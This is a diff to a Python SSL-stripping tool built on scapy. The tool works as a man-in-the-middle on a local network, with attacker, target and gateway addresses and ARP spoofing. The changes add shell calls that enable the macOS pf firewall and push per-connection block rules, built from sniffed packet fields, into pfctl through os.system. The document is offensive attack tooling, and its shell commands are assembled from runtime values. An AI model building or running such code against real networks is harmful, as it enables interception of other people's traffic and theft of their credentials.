@@ -9,7 +9,7 @@ from datetime import datetime
 from scapy.all import sniff, TCP, IP, get_if_hwaddr, get_if_addr, Ether, sendp, srp, ARP, Raw
 import sys
 import signal
-
+import os
 
 class SSLStripper:
     def __init__(self, interface, target_ip, gateway_ip) -> None:
@@ -18,6 +18,7 @@ class SSLStripper:
         self.gateway_ip = gateway_ip
         self.spoofing = False
         self.forwarded_packets = set()  # Track packets we've forwarded
+        self.blocked_tcp = set()
 
         self.attacker_mac = get_if_hwaddr(interface)
         self.attacker_ip = get_if_addr(interface)
@@ -34,6 +35,23 @@ class SSLStripper:
 
         # Set up signal handler for graceful exit
         signal.signal(signal.SIGINT, self.signal_handler)
+
+
+        #Set up system
+        self.system_restart()
+
+    
+    def system_restart(self):
+        """Set up system for SSL stripping using pfctl"""
+        try:            
+            # Enable and load pf rules
+            os.system('pfctl -e')  # Enable pf
+            os.system('pfctl -f /etc/pf.conf')  # Load rules
+            
+            print("[*] PF rules configured successfully")
+        except Exception as e:
+            print(f"[!] Error setting up PF rules: {e}")
+            self.stop()
 
     def signal_handler(self, signum, frame):
         """Handle Ctrl+C signal"""
@@ -75,16 +93,47 @@ class SSLStripper:
     def stop(self):
         print("[*] Stopping SSL stripping...")
         self.spoofing = False
+        self.system_restart()
+    
+    def is_tcp(self, packet):
+        if not packet.haslayer(TCP):
+            return False
+        flags = str(packet[TCP].flags)
+        return flags == 'S'
+    
+    def get_tcp(self, packet):
+        return (packet[IP].src, packet[TCP].sport, packet[IP].dst, packet[TCP].dport)
+
 
     def handle_packet(self, packet):
         if not packet.haslayer(TCP) or not packet.haslayer(IP):
             return
+
+        if self.is_tcp(packet) and self.get_tcp(packet) not in self.blocked_tcp:
+            # block drop quick on en0 proto tcp from 192.168.0.186 to any port 80
+            # block drop quick on en0 proto tcp from 192.0.43.8 to any port 50000
+            # Extract source and destination IPs
+            src_ip = packet[IP].src
+            dst_ip = packet[IP].dst
+            
+            # Extract source and destination ports
+            src_port = packet[TCP].sport
+            dst_port = packet[TCP].dport
+            
+            # Set firewall rules to block traffic
+            os.system(f"pfctl -e")  # Enable pf firewall
+            os.system(f"pfctl -f /etc/pf.conf")  # Load default rules
+            os.system(f"echo 'block drop quick on {self.interface} proto tcp from {src_ip} to any port {dst_port}' | pfctl -f -")
+            os.system(f"echo 'block drop quick on {self.interface} proto tcp from {dst_ip} to any port {src_port}' | pfctl -f -")
+
+            self.blocked_tcp.add(self.get_tcp(packet))
 
         # Create a unique identifier for this packet
         packet_id = (packet[IP].id, packet[TCP].seq)
 
         # Skip if we've already forwarded this packet
         if packet_id in self.forwarded_packets:
+            self.forwarded_packets.remove(packet_id)
             return
 
         # Check if packet is from target to gateway or vice versa
@@ -143,5 +192,4 @@ if __name__ == "__main__":
     spoofer = SSLStripper(interface, target_ip, gateway_ip)
     spoofer.start()
 
-# TODO: vi sao k forward http
 # TODO: auto set rule
